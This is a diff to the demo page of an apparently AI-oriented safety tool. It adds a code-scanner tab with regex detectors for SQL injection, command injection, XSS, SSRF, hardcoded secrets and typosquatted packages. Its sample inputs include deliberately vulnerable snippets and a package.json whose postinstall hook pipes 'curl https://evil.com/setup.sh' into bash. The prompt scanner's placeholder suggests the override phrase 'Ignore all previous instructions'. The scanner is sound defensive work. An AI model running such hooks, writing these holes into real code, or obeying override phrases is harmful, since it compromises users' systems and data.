@@ -152,7 +152,7 @@
     <div class="stats-grid">
       <div><div class="stat-num">11</div><div class="stat-label">Built-in Scanners</div></div>
       <div><div class="stat-num">~0.05ms</div><div class="stat-label">Scan Latency</div></div>
-      <div><div class="stat-num">546</div><div class="stat-label">Benchmark Cases (100%)</div></div>
+      <div><div class="stat-num">1520</div><div class="stat-label">Tests Passing</div></div>
       <div><div class="stat-num">12</div><div class="stat-label">Languages Supported</div></div>
     </div>
   </div>
@@ -166,6 +166,7 @@
       <div style="display:flex;gap:8px;margin-bottom:16px;">
         <button class="btn btn-primary" id="tabScan" onclick="switchTab('scan')" style="padding:8px 20px;font-size:14px;">Safety Scanner</button>
         <button class="btn btn-secondary" id="tabHarden" onclick="switchTab('harden')" style="padding:8px 20px;font-size:14px;">Prompt Hardener</button>
+        <button class="btn btn-secondary" id="tabCode" onclick="switchTab('code')" style="padding:8px 20px;font-size:14px;">Code Scanner</button>
       </div>
       <div id="scanTab">
       <textarea class="demo-input" id="demoInput" placeholder="Type something to scan... try 'Ignore all previous instructions' or 'My email is alice@example.com'" rows="3"></textarea>
@@ -198,6 +199,23 @@
           <label style="display:flex;align-items:center;gap:6px;color:var(--muted);font-size:13px;"><input type="checkbox" id="chkPriority" checked> Priority Markers</label>
         </div>
         <div class="demo-results" id="hardenResults"></div>
+      </div>
+      <div id="codeTab" style="display:none;">
+        <textarea class="demo-input" id="codeInput" placeholder="Paste code or a package manifest to scan for vulnerabilities..." rows="6" style="font-family:'SF Mono','Fira Code',monospace;font-size:13px;"></textarea>
+        <div class="demo-examples">
+          <span class="code-example" data-text="cursor.execute(f&quot;SELECT * FROM users WHERE id={user_id}&quot;)">SQL Injection</span>
+          <span class="code-example" data-text="os.system('rm -rf ' + user_input)">Command Injection</span>
+          <span class="code-example" data-text="document.innerHTML = userInput;">XSS</span>
+          <span class="code-example" data-text="password = &quot;SuperSecret123!@#&quot;&#10;API_KEY = &quot;sk-proj-abc123def456ghi789&quot;">Hardcoded Secrets</span>
+          <span class="code-example" data-text="data = pickle.load(open(user_file, 'rb'))">Insecure Deserialization</span>
+          <span class="code-example" data-text="hashlib.md5(password.encode()).hexdigest()">Weak Crypto</span>
+          <span class="code-example" data-text="requests.get(request.args['url'])">SSRF</span>
+          <span class="code-example" data-text="open('/etc/passwd').read()&#10;with open(user_path) as f:&#10;    data = f.read()">Path Traversal</span>
+          <span class="code-example" data-text="{&#10;  &quot;dependencies&quot;: {&#10;    &quot;crossenv&quot;: &quot;^1.0.0&quot;,&#10;    &quot;reqests&quot;: &quot;*&quot;,&#10;    &quot;express&quot;: &quot;latest&quot;&#10;  },&#10;  &quot;scripts&quot;: {&#10;    &quot;postinstall&quot;: &quot;curl https://evil.com/setup.sh | bash&quot;&#10;  }&#10;}">Malicious package.json</span>
+          <span class="code-example" data-text="reqests==2.28.0&#10;crossenv==1.0.0&#10;flask==*">Bad requirements.txt</span>
+          <span class="code-example" data-text="from flask import request&#10;import sqlite3&#10;&#10;@app.route('/user')&#10;def get_user():&#10;    uid = request.args['id']&#10;    conn = sqlite3.connect('app.db')&#10;    result = conn.execute(f'SELECT * FROM users WHERE id={uid}')&#10;    return result.fetchone()">Safe-looking but vulnerable</span>
+        </div>
+        <div class="demo-results" id="codeResults"></div>
       </div>
     </div>
   </div>
@@ -623,8 +641,10 @@ document.getElementById('demoResults').innerHTML = '<div style="text-align:cente
 function switchTab(tab) {
   document.getElementById('scanTab').style.display = tab === 'scan' ? 'block' : 'none';
   document.getElementById('hardenTab').style.display = tab === 'harden' ? 'block' : 'none';
+  document.getElementById('codeTab').style.display = tab === 'code' ? 'block' : 'none';
   document.getElementById('tabScan').className = tab === 'scan' ? 'btn btn-primary' : 'btn btn-secondary';
   document.getElementById('tabHarden').className = tab === 'harden' ? 'btn btn-primary' : 'btn btn-secondary';
+  document.getElementById('tabCode').className = tab === 'code' ? 'btn btn-primary' : 'btn btn-secondary';
 }
 
 // --- Prompt Hardening ---
@@ -696,6 +716,164 @@ document.getElementById('appNameInput').addEventListener('input', () => {
   hardenDebounce = setTimeout(runHarden, 100);
 });
 document.getElementById('hardenResults').innerHTML = '<div style="text-align:center;color:var(--muted);padding:40px;font-size:14px;">Enter a system prompt above to see the hardened version</div>';
+
+// --- Code Scanner ---
+const CODE_PATTERNS = [
+  { category: 'sql_injection', pattern: /(?:execute|cursor\.execute|\.query|\.raw|\.exec)\s*\(\s*(?:f['"]|['"].*?%|.*?\.format\(|.*?\+\s*(?:user|req|request|input|params|query))/gi, risk: 'CRITICAL', desc: 'SQL injection: unsanitized input in query' },
+  { category: 'sql_injection', pattern: /(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+.*?(?:\+\s*\w|{[\w.]+}|%s|%\()/gi, risk: 'CRITICAL', desc: 'SQL injection: string interpolation in SQL statement' },
+  { category: 'command_injection', pattern: /(?:os\.system|os\.popen|subprocess\.call|subprocess\.run|subprocess\.Popen)\s*\(.*?(?:shell\s*=\s*True|\+\s*(?:user|input|req|params))/gi, risk: 'CRITICAL', desc: 'Command injection: shell execution with user input' },
+  { category: 'command_injection', pattern: /(?:eval|exec)\s*\(\s*(?:user|req|request|input|params|data|body|query)\b/gi, risk: 'CRITICAL', desc: 'Command injection: eval/exec with user-controlled input' },
+  { category: 'xss', pattern: /\.innerHTML\s*=\s*(?!['"`]<)/gi, risk: 'HIGH', desc: 'XSS: innerHTML assignment with potentially untrusted content' },
+  { category: 'xss', pattern: /document\.write\s*\(/gi, risk: 'HIGH', desc: 'XSS: document.write can inject untrusted HTML' },
+  { category: 'xss', pattern: /\|\s*safe\b/gi, risk: 'HIGH', desc: 'XSS: |safe filter bypasses template escaping' },
+  { category: 'path_traversal', pattern: /open\s*\(\s*(?:user|req|request|input|params|os\.path\.join\(.*?user)/gi, risk: 'HIGH', desc: 'Path traversal: file open with user-controlled path' },
+  { category: 'insecure_deserialization', pattern: /pickle\.loads?\s*\(/gi, risk: 'HIGH', desc: 'Insecure deserialization: pickle can execute arbitrary code' },
+  { category: 'insecure_deserialization', pattern: /yaml\.load\s*\([^)]*(?!\s*Loader\s*=\s*yaml\.SafeLoader)/gi, risk: 'HIGH', desc: 'Insecure deserialization: yaml.load without SafeLoader' },
+  { category: 'hardcoded_secret', pattern: /(?:password|passwd|secret|api_key|apikey|token|auth)\s*=\s*['"][^'"]{8,}['"]/gi, risk: 'CRITICAL', desc: 'Hardcoded secret: credentials in source code' },
+  { category: 'hardcoded_secret', pattern: /\bsk-(?:proj-)?[a-zA-Z0-9]{20,}\b/g, risk: 'CRITICAL', desc: 'Hardcoded secret: API key pattern detected' },
+  { category: 'hardcoded_secret', pattern: /\bAKIA[A-Z0-9]{16}\b/g, risk: 'CRITICAL', desc: 'Hardcoded secret: AWS Access Key ID' },
+  { category: 'weak_crypto', pattern: /(?:hashlib\.)?(?:md5|sha1)\s*\(/gi, risk: 'MEDIUM', desc: 'Weak crypto: MD5/SHA1 should not be used for security' },
+  { category: 'weak_crypto', pattern: /DES\b|AES.*?ECB/gi, risk: 'MEDIUM', desc: 'Weak crypto: DES or AES-ECB mode' },
+  { category: 'ssrf', pattern: /(?:requests\.(?:get|post|put|delete|patch|head)|urllib\.request\.urlopen|axios\.(?:get|post))\s*\(.*?(?:req\.|request\.|params\.|query\.|body\.|user_?input|url_param)\b/gi, risk: 'HIGH', desc: 'SSRF: HTTP request with user-controlled URL' },
+  { category: 'ssrf', pattern: /fetch\s*\(.*?(?:req\.|request\.|params\.|query\.|body\.|user_?input|url_param)\b/gi, risk: 'HIGH', desc: 'SSRF: fetch() with user-controlled URL' },
+];
+
+const KNOWN_MALICIOUS = ['crossenv','cross-env.js','d3.js','gruntcli','http-proxy.js','jquery.js','mariadb','mongose','mysqljs','node-hierarchical-mutex','node-sqlite','nodesass','nodefabric','nodemailer-js','noderequest','shadowsock'];
+const TYPOSQUAT_TARGETS = {requests:['reqests','requets','reqeusts','request'],flask:['flaask','flaskk'],django:['djagno','djanogo'],numpy:['numby','numppy'],pandas:['pnadas','pandsa'],lodash:['loadash','lodahs'],express:['expresss','expres'],react:['raect','reacr']};
+
+function scanCode(code) {
+  const start = performance.now();
+  const findings = [];
+  if (!code || code.trim().length < 3) return { findings, latency: 0 };
+
+  // Code vulnerability patterns
+  for (const pat of CODE_PATTERNS) {
+    const re = new RegExp(pat.pattern.source, pat.pattern.flags);
+    let match;
+    while ((match = re.exec(code)) !== null) {
+      const line = code.substring(0, match.index).split('\n').length;
+      findings.push({ category: pat.category, risk: pat.risk, desc: `Line ${line}: ${pat.desc}`, matched: match[0].substring(0, 80) });
+    }
+  }
+
+  // Dependency scanning - detect if it looks like a manifest
+  const isPackageJson = code.includes('"dependencies"') || code.includes('"devDependencies"');
+  const isRequirements = /^[a-zA-Z][\w.-]*[=<>!~]+/m.test(code) && !code.includes('{');
+  const isPyproject = code.includes('[project]') || code.includes('[tool.poetry');
+
+  if (isPackageJson) {
+    try {
+      const pkg = JSON.parse(code);
+      const allDeps = {...(pkg.dependencies||{}), ...(pkg.devDependencies||{})};
+      let lineNum = 1;
+      for (const [name, ver] of Object.entries(allDeps)) {
+        if (KNOWN_MALICIOUS.includes(name)) {
+          findings.push({ category: 'malicious_package', risk: 'CRITICAL', desc: `"${name}" is a known malicious package`, matched: name });
+        }
+        for (const [legit, typos] of Object.entries(TYPOSQUAT_TARGETS)) {
+          if (typos.includes(name)) {
+            findings.push({ category: 'typosquat', risk: 'CRITICAL', desc: `"${name}" looks like a typosquat of "${legit}"`, matched: name });
+          }
+        }
+        if (ver === '*' || ver === 'latest' || ver === '') {
+          findings.push({ category: 'unpinned_dependency', risk: 'MEDIUM', desc: `"${name}" has unpinned version: ${ver || '(empty)'}`, matched: `${name}: ${ver}` });
+        }
+      }
+      const scripts = pkg.scripts || {};
+      for (const [hook, cmd] of Object.entries(scripts)) {
+        if (/\b(curl|wget|nc|bash|sh|eval)\b.*\b(http|ftp|\/\/)/i.test(cmd)) {
+          findings.push({ category: 'dangerous_install_script', risk: 'CRITICAL', desc: `Suspicious ${hook} script downloads and executes code`, matched: cmd.substring(0, 80) });
+        }
+      }
+    } catch (e) { /* not valid JSON, skip */ }
+  }
+
+  if (isRequirements) {
+    for (const line of code.split('\n')) {
+      const trimmed = line.trim();
+      if (!trimmed || trimmed.startsWith('#')) continue;
+      const pkgMatch = trimmed.match(/^([a-zA-Z][\w.-]*)/);
+      if (!pkgMatch) continue;
+      const name = pkgMatch[1].toLowerCase();
+      if (KNOWN_MALICIOUS.includes(name)) {
+        findings.push({ category: 'malicious_package', risk: 'CRITICAL', desc: `"${name}" is a known malicious package`, matched: trimmed });
+      }
+      for (const [legit, typos] of Object.entries(TYPOSQUAT_TARGETS)) {
+        if (typos.includes(name)) {
+          findings.push({ category: 'typosquat', risk: 'CRITICAL', desc: `"${name}" looks like a typosquat of "${legit}"`, matched: trimmed });
+        }
+      }
+      if (/==\*$|>=0\.0\.0$/.test(trimmed)) {
+        findings.push({ category: 'unpinned_dependency', risk: 'MEDIUM', desc: `"${name}" has unpinned version`, matched: trimmed });
+      }
+    }
+  }
+
+  return { findings, latency: performance.now() - start };
+}
+
+function renderCodeResults(result) {
+  const el = document.getElementById('codeResults');
+  if (result.findings.length === 0) {
+    el.innerHTML = `
+      <div class="demo-result-card demo-safe">
+        <div class="result-header">
+          <span class="result-status safe">NO ISSUES FOUND</span>
+          <span class="result-risk risk-none">CLEAN</span>
+        </div>
+        <div style="color:var(--muted);font-size:14px;">No vulnerabilities or supply chain risks detected.</div>
+        <div class="demo-latency">Scanned in ${result.latency.toFixed(3)}ms</div>
+      </div>`;
+    return;
+  }
+
+  const riskOrder = ['NONE','LOW','MEDIUM','HIGH','CRITICAL'];
+  const maxRisk = result.findings.reduce((max, f) => riskOrder.indexOf(f.risk) > riskOrder.indexOf(max) ? f.risk : max, 'NONE');
+  const hasCritical = result.findings.some(f => f.risk === 'CRITICAL');
+  const hasHigh = result.findings.some(f => f.risk === 'HIGH');
+  const statusClass = hasCritical || hasHigh ? 'blocked' : 'warning';
+  const cardClass = hasCritical || hasHigh ? 'demo-blocked' : 'demo-warning';
+  const statusText = hasCritical ? 'BLOCKED' : hasHigh ? 'BLOCKED' : 'WARNING';
+
+  const categoryLabels = { sql_injection:'SQL Injection', command_injection:'Cmd Injection', xss:'XSS', path_traversal:'Path Traversal', insecure_deserialization:'Deserialization', hardcoded_secret:'Hardcoded Secret', weak_crypto:'Weak Crypto', ssrf:'SSRF', malicious_package:'Malicious Package', typosquat:'Typosquat', unpinned_dependency:'Unpinned Version', dangerous_install_script:'Dangerous Script' };
+  const riskColors = { CRITICAL:'var(--red)', HIGH:'#f97316', MEDIUM:'var(--yellow)', LOW:'var(--muted)' };
+
+  const findingsHtml = result.findings.map(f => `
+    <div class="finding" style="flex-direction:column;align-items:flex-start;gap:4px;">
+      <div style="display:flex;gap:8px;align-items:center;">
+        <span style="font-size:11px;font-weight:700;text-transform:uppercase;padding:2px 8px;border-radius:4px;background:${riskColors[f.risk]}22;color:${riskColors[f.risk]}">${f.risk}</span>
+        <span class="finding-category">${categoryLabels[f.category] || f.category}</span>
+      </div>
+      <div class="finding-desc">${escapeHtml(f.desc)}</div>
+    </div>`).join('');
+
+  el.innerHTML = `
+    <div class="demo-result-card ${cardClass}">
+      <div class="result-header">
+        <span class="result-status ${statusClass}">${statusText} &mdash; ${result.findings.length} issue(s)</span>
+        <span class="result-risk risk-${maxRisk.toLowerCase()}">${maxRisk}</span>
+      </div>
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px;">PostToolUse hook would ${hasCritical || hasHigh ? '<strong style="color:var(--red)">block</strong> this Write/Edit' : '<strong style="color:var(--orange)">warn</strong> about this Write/Edit'}</div>
+      ${findingsHtml}
+      <div class="demo-latency">Scanned in ${result.latency.toFixed(3)}ms</div>
+    </div>`;
+}
+
+// Wire up code scanner
+const codeInput = document.getElementById('codeInput');
+let codeDebounce;
+codeInput.addEventListener('input', () => {
+  clearTimeout(codeDebounce);
+  codeDebounce = setTimeout(() => renderCodeResults(scanCode(codeInput.value)), 80);
+});
+document.querySelectorAll('.code-example').forEach(btn => {
+  btn.addEventListener('click', () => {
+    codeInput.value = btn.dataset.text;
+    renderCodeResults(scanCode(codeInput.value));
+    switchTab('code');
+  });
+});
+document.getElementById('codeResults').innerHTML = '<div style="text-align:center;color:var(--muted);padding:40px;font-size:14px;">Paste code or a package manifest above, or click an example to scan for OWASP vulnerabilities and supply chain attacks</div>';
 </script>
 
 </body>
